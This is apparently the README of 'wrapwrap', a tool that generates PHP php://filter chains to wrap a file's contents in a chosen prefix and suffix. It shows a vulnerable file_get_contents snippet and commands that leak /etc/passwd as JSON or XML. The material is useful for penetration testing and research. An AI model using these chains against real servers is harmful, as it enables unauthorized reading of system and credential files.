# wrapwrap

Generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file.

Refer to [our blogpost](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix) for details about the implementation.

# Contributing

If you want to contribute, the main python file contains a few TODOs which should not be hard to implement.

# Examples

## JSON

Say you have code like so:

```php
$data = file_get_contents($_POST['url']);
$data = json_decode($data);
echo $data->message;
```

To obtain the contents of some file, we'd like to have: `{"message":"<file contents>"}`. This can be done using:

```shell
$ ./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
[*] Dumping 1008 bytes from /etc/passwd.
[+] Wrote filter chain to chain.txt (size=705031).
```

This yields:

```json
{"message":"root:x:0:0:root:/root:/bin/bash=0Adaemon:..."}
```

## XML

If some PHP code parses an arbitrary XML and displays the contents of the `<name>` tag, we'd like something like: `<root><name>[file contents]</name></root>`. As a result, we'd use:

```shell
$ ./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000
[*] Dumping 1008 bytes from /etc/passwd.
[+] Wrote filter chain to chain.txt (size=709871).
```

This produces:

```xml
<root><name>root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:...</name></root>
```